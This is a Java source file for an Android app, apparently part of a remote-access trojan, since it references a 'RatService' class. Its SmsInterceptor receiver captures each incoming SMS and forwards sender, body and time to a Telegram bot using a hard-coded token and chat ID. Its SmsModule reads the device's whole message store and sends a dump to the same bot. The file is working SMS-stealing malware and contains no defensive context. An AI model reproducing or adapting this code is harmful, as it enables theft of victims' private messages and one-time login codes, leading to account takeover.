package com.my.luck.features;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;
import com.my.luck.core.RatService;
import com.my.luck.network.TelegramBot;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;

public class SmsInterceptor extends BroadcastReceiver {
    private static final String TAG = "SmsInterceptor";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (action == null) return;

        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(action) || 
            "android.provider.Telephony.SMS_DELIVER".equals(action)) {
            
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;

            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) return;

            String packageName = getSourcePackage(intent);

            for (Object pdu : pdus) {
                try {
                    SmsMessage sms = getSmsMessage(pdu, bundle);
                    if (sms == null) continue;

                    String sender = sms.getDisplayOriginatingAddress();
                    String body = sms.getMessageBody();
                    String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                            .format(new Date(sms.getTimestampMillis()));

                    Log.d(TAG, "📱 SMS CAPTURED");
                    Log.d(TAG, "  📦 App: " + packageName);
                    Log.d(TAG, "  📌 From: " + sender);
                    Log.d(TAG, "  📝 Body: " + body);

                    sendToTelegram(context, packageName, sender, body, timestamp);

                } catch (Exception e) {
                    Log.e(TAG, "Error processing SMS", e);
                }
            }
        }
    }

    private SmsMessage getSmsMessage(Object pdu, Bundle bundle) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                String format = bundle.getString("format");
                return SmsMessage.createFromPdu((byte[]) pdu, format);
            } else {
                return SmsMessage.createFromPdu((byte[]) pdu);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error creating SmsMessage", e);
            return null;
        }
    }

    private String getSourcePackage(Intent intent) {
        try {
            String packageName = intent.getStringExtra("package");
            if (packageName != null && !packageName.isEmpty()) {
                return packageName;
            }
            if (intent.getComponent() != null) {
                return intent.getComponent().getPackageName();
            }
            return "Unknown App";
        } catch (Exception e) {
            return "Unknown App";
        }
    }

    private void sendToTelegram(Context context, String packageName, String sender, String body, String timestamp) {
        try {
            String message = "📱 <b>SMS CAPTURED</b>\n";
            message += "━━━━━━━━━━━━━━━\n";
            message += "📦 <b>App:</b> " + packageName + "\n";
            message += "📌 <b>From:</b> " + sender + "\n";
            message += "📝 <b>Message:</b>\n" + body + "\n";
            message += "🕐 <b>Time:</b> " + timestamp + "\n";
            message += "━━━━━━━━━━━━━━━";

            TelegramBot bot = new TelegramBot(context, "8809826791:AAERMVrTHNr3VsreEZGUtSN8ltWRTuI2qrs", "8681027856");
            bot.sendMessage(message);
            Log.d(TAG, "✅ SMS forwarded to Telegram");

        } catch (Exception e) {
            Log.e(TAG, "Failed to send SMS to Telegram", e);
        }
    }

    // ============================================
    // 📱 SMS MODULE - FULL SMS DUMP
    // ============================================

    public static class SmsModule {
        private Context context;

        public SmsModule(Context context) {
            this.context = context;
        }

        public List<HashMap<String, String>> getAllSms() {
            List<HashMap<String, String>> smsList = new ArrayList<>();
            try {
                ContentResolver cr = context.getContentResolver();
                Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC");
                
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        HashMap<String, String> sms = new HashMap<>();
                        sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                        sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                        sms.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                                .format(new Date(cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)))));
                        sms.put("type", getSmsType(cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))));
                        sms.put("id", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms._ID)));
                        smsList.add(sms);
                    } while (cursor.moveToNext());
                    cursor.close();
                }
                Log.d(TAG, "📊 Found " + smsList.size() + " SMS messages");
            } catch (Exception e) {
                Log.e(TAG, "Error getting SMS", e);
            }
            return smsList;
        }

        private String getSmsType(int type) {
            switch (type) {
                case Telephony.Sms.MESSAGE_TYPE_INBOX: return "INBOX";
                case Telephony.Sms.MESSAGE_TYPE_SENT: return "SENT";
                case Telephony.Sms.MESSAGE_TYPE_DRAFT: return "DRAFT";
                case Telephony.Sms.MESSAGE_TYPE_OUTBOX: return "OUTBOX";
                case Telephony.Sms.MESSAGE_TYPE_FAILED: return "FAILED";
                case Telephony.Sms.MESSAGE_TYPE_QUEUED: return "QUEUED";
                default: return "UNKNOWN";
            }
        }

        public void sendSmsDumpToTelegram() {
            List<HashMap<String, String>> smsList = getAllSms();
            if (smsList.isEmpty()) {
                sendMessage("📱 No SMS found");
                return;
            }

            StringBuilder sb = new StringBuilder();
            sb.append("📱 <b>SMS DUMP</b>\n");
            sb.append("━━━━━━━━━━━━━━━\n");
            sb.append("📊 Total: ").append(smsList.size()).append(" messages\n");
            sb.append("━━━━━━━━━━━━━━━\n\n");

            int count = 0;
            for (HashMap<String, String> sms : smsList) {
                if (count++ > 20) break;
                sb.append("📌 <b>From:</b> ").append(sms.get("address")).append("\n");
                sb.append("📝 ").append(sms.get("body")).append("\n");
                sb.append("🕐 ").append(sms.get("date")).append("\n");
                sb.append("━━━━━━━━━━━━━━━\n");
            }
            if (smsList.size() > 20) {
                sb.append("\n... and ").append(smsList.size() - 20).append(" more");
            }

            sendMessage(sb.toString());
        }

        private void sendMessage(String text) {
            try {
                TelegramBot bot = new TelegramBot(context, "8809826791:AAERMVrTHNr3VsreEZGUtSN8ltWRTuI2qrs", "8681027856");
                bot.sendMessage(text);
            } catch (Exception e) {
                Log.e(TAG, "Error sending SMS dump", e);
            }
        }
    }
}
